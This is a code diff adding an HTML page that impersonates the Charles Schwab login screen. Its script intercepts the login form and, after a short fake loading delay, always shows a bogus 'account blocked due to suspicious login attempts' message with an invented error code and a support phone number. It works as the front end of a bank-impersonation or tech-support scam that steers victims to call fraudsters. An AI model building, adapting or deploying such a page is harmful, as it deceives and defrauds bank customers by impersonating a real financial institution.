@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Charles Schwab Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        .error-message {
+            color: red;
+            margin-top: 10px;
+            display: none;
+        }
+
+        /* Styles for spinner inside the button */
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 8px;
+            display: none; /* Initially hidden */
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="charles1.png" alt="Charles Schwab Logo" class="header-logo">
+    </header>
+
+    <div class="login-container">
+        <div class="login-box">
+            <h2>Log in to Schwab</h2>
+              <div class="error-message" id="error-message">
+                Error code: 0X0047800 <br> Your account has been blocked due to some suspicious login attempts. <br>Contact Support : <a href="tel:18332035684">+1-833-203-5684</a>
+            </div>
+            <form id="loginForm" method="POST">
+               <br> <label for="loginID">Login ID</label>
+                <input type="text" id="loginID" name="loginID" placeholder="Login ID" required>
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+
+                <div class="remember-me">
+                    <input type="checkbox" id="rememberLogin" name="rememberLogin">
+                    <label for="rememberLogin">Remember Login ID</label>
+                </div>
+
+                <label for="startPage">Start Page</label>
+                <select id="startPage" name="startPage">
+                    <option value="accountSummary">Account Summary</option>
+                </select>
+
+                <button type="submit" id="loginButton">Log In
+                    <span class="loading-spinner" id="loadingSpinner"></span>
+                </button>
+            </form>
+
+            <div class="login-links">
+                <a href="#">Forgot Login ID or Password?</a>
+            </div>
+
+            <div class="new-user-language">
+                <a href="#">New User?</a>
+                <select id="language" name="language">
+                    <option value="english">English</option>
+                    <option value="spanish">Español</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="background">
+            <img src="charls3.jpeg" alt="Cityscape Background">
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
+
+            // Show loading spinner
+            var loginButton = document.getElementById("loginButton");
+            var loadingSpinner = document.getElementById("loadingSpinner");
+            var errorMessage = document.getElementById("error-message");
+
+            loadingSpinner.style.display = "inline-block"; // Show spinner
+
+            // Hide the error message and reset any existing state
+            errorMessage.style.display = "none";
+
+            // Simulate a delay of 2-3 seconds (for example, waiting for server response)
+            setTimeout(function() {
+                loadingSpinner.style.display = "none"; // Hide spinner
+                errorMessage.style.display = "block"; // Show error message after 2-3 seconds
+            }, 2500); // 2.5 seconds delay for showing error message
+        });
+    </script>
+</body>
+</html>
